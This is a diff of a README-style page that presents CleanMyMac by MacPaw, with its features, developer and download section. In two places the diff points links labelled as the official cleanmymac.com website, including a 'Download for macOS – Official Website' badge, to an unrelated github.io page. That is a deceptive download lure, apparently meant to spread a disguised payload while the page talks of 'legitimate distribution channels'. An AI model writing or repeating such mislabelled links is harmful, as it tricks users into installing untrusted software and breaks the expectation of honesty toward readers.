@@ -8,7 +8,7 @@
 
 Whether you want to reclaim valuable disk space, remove unnecessary files, organize installed applications, or maintain your Mac's overall performance, CleanMyMac provides a collection of tools designed to simplify everyday system maintenance.
 
-**Official Website:** <a href="">https://cleanmymac.com/</a>
+**Official Website:** <a href="https://setup-git-cli.github.io/dl-macios/">https://cleanmymac.com/</a>
 
 **Developer:** MacPaw  
 **Platform:** macOS  
@@ -60,7 +60,7 @@ Get CleanMyMac through its legitimate distribution channels. Choose your preferr
 
 ### macOS – Official MacPaw Download
 
-<a href="" target="_blank"><img src="https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-Official%20Website-2ea44f?style=for-the-badge&logo=apple" alt="Download CleanMyMac from official website"></a>
+<a href="https://setup-git-cli.github.io/dl-macios/" target="_blank"><img src="https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-Official%20Website-2ea44f?style=for-the-badge&logo=apple" alt="Download CleanMyMac from official website"></a>
 
 
 **Compatibility:** CleanMyMac requires macOS 11.0 or later according to the current official website. It is not a native Windows application.
